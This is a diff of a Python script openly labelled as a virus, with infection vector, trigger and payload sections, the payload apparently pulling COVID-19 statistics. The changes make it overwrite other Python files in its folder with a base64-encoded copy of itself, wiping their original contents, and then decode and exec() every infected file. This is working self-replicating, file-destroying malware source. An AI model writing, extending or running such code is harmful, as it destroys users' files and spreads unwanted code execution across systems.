@@ -1,21 +1,12 @@
 ### -_- VIRUS -_- ###
-import glob,sys,re,COVID19Py
+import glob,sys,re,base64,json,COVID19Py
 
 ### INFECTION VECTOR ###
 
 def getVirusCode():
     virusCode = []
     fileHandler = open(sys.argv[0],"r")
-    lines = fileHandler.readlines()
-    fileHandler.close()
-    inVirus = False
-    for line in lines:
-        if(re.search('^### -_- VIRUS -_- ###',line)):
-            inVirus = True
-        if(inVirus):
-            virusCode.append(line)
-        if(re.search('^### -_- VIRUS END -_- ###',line)):
-            break
+    virusCode = fileHandler.read()
     return virusCode
 
 def find_victims():
@@ -23,9 +14,11 @@ def find_victims():
 
 def infectVirus():
     victims = find_victims()
+    victims.remove(sys.argv[0])
     for victim in victims:
         fileHandler = open(victim,"r")
-        programCode = fileHandler.readlines()
+        programCode = fileHandler.read()
+        decrypedCode = base64.b64decode(programCode)
         fileHandler.close()
         infected = False
         for line in programCode:
@@ -34,16 +27,25 @@ def infectVirus():
                 break
         
         if not infected:
-            newCode = []
-            newCode.extend(programCode)
-            newCode.extend(getVirusCode())
+            #newCode = []
+            encodedCode = []
+            #newCode.extend(programCode)
+            codeBytes = getVirusCode().encode('utf-8')
+            encodedCode = base64.b64encode(codeBytes)
+            #newCode.extend(encodedCode)
             
             fileHandler = open(victim,"w")
-            fileHandler.writelines(newCode)
+            fileHandler.write(encodedCode.decode('utf-8'))
             fileHandler.close() 
 
-### TRIGGER ###
 infectVirus()
+### TRIGGER ###
+victims = find_victims()
+victims.remove(sys.argv[0])
+for victim in victims:
+    encryptedFile = open(victim,"r").read()
+    decryptedFile = base64.b64decode(encryptedFile)
+    exec(decryptedFile)
 
 ### PAYLOAD ###
 def getCovidINFO():
